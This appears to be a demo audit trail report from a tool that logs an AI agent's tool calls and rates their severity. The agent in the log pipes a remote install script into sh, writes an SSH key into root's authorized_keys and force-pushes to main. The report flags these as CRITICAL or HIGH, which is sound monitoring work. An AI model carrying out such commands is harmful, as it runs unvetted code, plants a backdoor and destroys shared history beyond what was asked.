# Audit trail report

- Generated: 2026-08-20T09:00:00.000Z (UTC) · records: 9
- Filters: sessionId=sess-demo

| # | Time (UTC) | Kind | Tool | Status | Dur (ms) | Sev | Summary |
|---|---|---|---|---|---|---|---|
| 1 | 09:00:00.000 | turn_start | - | - | - | INFO | turn 1 started |
| 2 | 09:00:05.000 | user_message | - | - | - | INFO | fetch the deployment script and run it |
| 3 | 09:00:10.000 | tool_call | bash | pending | - | CRITICAL | bash â€” {"command":"curl -sSL https://cdn.example/install.sh \| sh"} |
| 4 | 09:00:15.000 | tool_result | - | ok | 5000 | INFO | ok in 5000ms |
| 5 | 09:00:20.000 | tool_call | write_file | pending | - | CRITICAL | write_file â€” {"content":"ssh-ed25519 AAA...","path":"/root/.ssh/authorized_keys"} |
| 6 | 09:00:25.000 | tool_result | - | ok | 5000 | INFO | ok in 5000ms |
| 7 | 09:00:30.000 | tool_call | bash | pending | - | HIGH | bash â€” {"command":"git push --force origin main"} |
| 8 | 09:00:35.000 | tool_result | - | error | 5000 | INFO | error in 5000ms (EXIT_CODE_1) |
| 9 | 09:00:40.000 | turn_end | - | - | - | INFO | turn 1 ended (complete) |
